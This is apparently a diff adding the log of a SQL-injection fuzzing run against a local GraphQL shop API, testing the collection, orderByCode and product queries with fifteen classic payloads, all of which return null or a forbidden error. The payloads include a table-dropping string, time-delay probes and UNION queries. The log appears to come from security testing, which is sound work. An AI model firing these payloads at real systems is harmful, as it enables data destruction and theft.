@@ -1,0 +1,277 @@
+[+] Introspecting http://localhost:3000/shop-api
+
+[>] Testing collection (string args: ['slug'])
+
+
+	Payload:  '
+	Query: query { collection(slug: " '") { id createdAt } }
+	Response: {"data":{"collection":null}}
+
+
+
+	Payload: ' OR '1'='1
+	Query: query { collection(slug: "' OR '1'='1") { id createdAt } }
+	Response: {"data":{"collection":null}}
+
+
+
+	Payload: ' OR 1=1--
+	Query: query { collection(slug: "' OR 1=1--") { id createdAt } }
+	Response: {"data":{"collection":null}}
+
+
+
+	Payload: ' OR 'a'='a
+	Query: query { collection(slug: "' OR 'a'='a") { id createdAt } }
+	Response: {"data":{"collection":null}}
+
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { collection(slug: "' UNION SELECT NULL--") { id createdAt } }
+	Response: {"data":{"collection":null}}
+
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { collection(slug: "'; DROP TABLE users; --") { id createdAt } }
+	Response: {"data":{"collection":null}}
+
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { collection(slug: "' AND 1=0 UNION SELECT NULL,NULL--") { id createdAt } }
+	Response: {"data":{"collection":null}}
+
+
+
+	Payload: ') OR ('1'='1
+	Query: query { collection(slug: "') OR ('1'='1") { id createdAt } }
+	Response: {"data":{"collection":null}}
+
+
+
+	Payload: admin' --
+	Query: query { collection(slug: "admin' --") { id createdAt } }
+	Response: {"data":{"collection":null}}
+
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { collection(slug: "' OR sleep(5)--") { id createdAt } }
+	Response: {"data":{"collection":null}}
+
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { collection(slug: "' AND sleep(5)--") { id createdAt } }
+	Response: {"data":{"collection":null}}
+
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { collection(slug: "' WAITFOR DELAY '0:0:5'--") { id createdAt } }
+	Response: {"data":{"collection":null}}
+
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { collection(slug: "' OR 'x'='x' /*") { id createdAt } }
+	Response: {"data":{"collection":null}}
+
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { collection(slug: "' OR EXISTS(SELECT * FROM users)--") { id createdAt } }
+	Response: {"data":{"collection":null}}
+
+
+
+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { collection(slug: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { id createdAt } }
+	Response: {"data":{"collection":null}}
+
+
+[>] Testing orderByCode (string args: ['code'])
+
+
+	Payload:  '
+	Query: query { orderByCode(code: " '") { id createdAt } }
+	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["orderByCode"],"extensions":{"code":"FORBIDDEN"}}],"data":{"orderByCode":null}}
+
+
+
+	Payload: ' OR '1'='1
+	Query: query { orderByCode(code: "' OR '1'='1") { id createdAt } }
+	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["orderByCode"],"extensions":{"code":"FORBIDDEN"}}],"data":{"orderByCode":null}}
+
+
+
+	Payload: ' OR 1=1--
+	Query: query { orderByCode(code: "' OR 1=1--") { id createdAt } }
+	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["orderByCode"],"extensions":{"code":"FORBIDDEN"}}],"data":{"orderByCode":null}}
+
+
+
+	Payload: ' OR 'a'='a
+	Query: query { orderByCode(code: "' OR 'a'='a") { id createdAt } }
+	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["orderByCode"],"extensions":{"code":"FORBIDDEN"}}],"data":{"orderByCode":null}}
+
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { orderByCode(code: "' UNION SELECT NULL--") { id createdAt } }
+	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["orderByCode"],"extensions":{"code":"FORBIDDEN"}}],"data":{"orderByCode":null}}
+
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { orderByCode(code: "'; DROP TABLE users; --") { id createdAt } }
+	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["orderByCode"],"extensions":{"code":"FORBIDDEN"}}],"data":{"orderByCode":null}}
+
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { orderByCode(code: "' AND 1=0 UNION SELECT NULL,NULL--") { id createdAt } }
+	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["orderByCode"],"extensions":{"code":"FORBIDDEN"}}],"data":{"orderByCode":null}}
+
+
+
+	Payload: ') OR ('1'='1
+	Query: query { orderByCode(code: "') OR ('1'='1") { id createdAt } }
+	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["orderByCode"],"extensions":{"code":"FORBIDDEN"}}],"data":{"orderByCode":null}}
+
+
+
+	Payload: admin' --
+	Query: query { orderByCode(code: "admin' --") { id createdAt } }
+	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["orderByCode"],"extensions":{"code":"FORBIDDEN"}}],"data":{"orderByCode":null}}
+
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { orderByCode(code: "' OR sleep(5)--") { id createdAt } }
+	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["orderByCode"],"extensions":{"code":"FORBIDDEN"}}],"data":{"orderByCode":null}}
+
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { orderByCode(code: "' AND sleep(5)--") { id createdAt } }
+	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["orderByCode"],"extensions":{"code":"FORBIDDEN"}}],"data":{"orderByCode":null}}
+
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { orderByCode(code: "' WAITFOR DELAY '0:0:5'--") { id createdAt } }
+	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["orderByCode"],"extensions":{"code":"FORBIDDEN"}}],"data":{"orderByCode":null}}
+
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { orderByCode(code: "' OR 'x'='x' /*") { id createdAt } }
+	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["orderByCode"],"extensions":{"code":"FORBIDDEN"}}],"data":{"orderByCode":null}}
+
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { orderByCode(code: "' OR EXISTS(SELECT * FROM users)--") { id createdAt } }
+	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["orderByCode"],"extensions":{"code":"FORBIDDEN"}}],"data":{"orderByCode":null}}
+
+
+
+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { orderByCode(code: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { id createdAt } }
+	Response: {"errors":[{"message":"You are not currently authorized to perform this action","locations":[{"line":1,"column":9}],"path":["orderByCode"],"extensions":{"code":"FORBIDDEN"}}],"data":{"orderByCode":null}}
+
+
+[>] Testing product (string args: ['slug'])
+
+
+	Payload:  '
+	Query: query { product(slug: " '") { id createdAt } }
+	Response: {"data":{"product":null}}
+
+
+
+	Payload: ' OR '1'='1
+	Query: query { product(slug: "' OR '1'='1") { id createdAt } }
+	Response: {"data":{"product":null}}
+
+
+
+	Payload: ' OR 1=1--
+	Query: query { product(slug: "' OR 1=1--") { id createdAt } }
+	Response: {"data":{"product":null}}
+
+
+
+	Payload: ' OR 'a'='a
+	Query: query { product(slug: "' OR 'a'='a") { id createdAt } }
+	Response: {"data":{"product":null}}
+
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { product(slug: "' UNION SELECT NULL--") { id createdAt } }
+	Response: {"data":{"product":null}}
+
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { product(slug: "'; DROP TABLE users; --") { id createdAt } }
+	Response: {"data":{"product":null}}
+
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { product(slug: "' AND 1=0 UNION SELECT NULL,NULL--") { id createdAt } }
+	Response: {"data":{"product":null}}
+
+
+
+	Payload: ') OR ('1'='1
+	Query: query { product(slug: "') OR ('1'='1") { id createdAt } }
+	Response: {"data":{"product":null}}
+
+
+
+	Payload: admin' --
+	Query: query { product(slug: "admin' --") { id createdAt } }
+	Response: {"data":{"product":null}}
+
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { product(slug: "' OR sleep(5)--") { id createdAt } }
+	Response: {"data":{"product":null}}
+
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { product(slug: "' AND sleep(5)--") { id createdAt } }
+	Response: {"data":{"product":null}}
+
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { product(slug: "' WAITFOR DELAY '0:0:5'--") { id createdAt } }
+	Response: {"data":{"product":null}}
+
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { product(slug: "' OR 'x'='x' /*") { id createdAt } }
+	Response: {"data":{"product":null}}
+
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { product(slug: "' OR EXISTS(SELECT * FROM users)--") { id createdAt } }
+	Response: {"data":{"product":null}}
+
+
+
+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { product(slug: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { id createdAt } }
+	Response: {"data":{"product":null}}
+
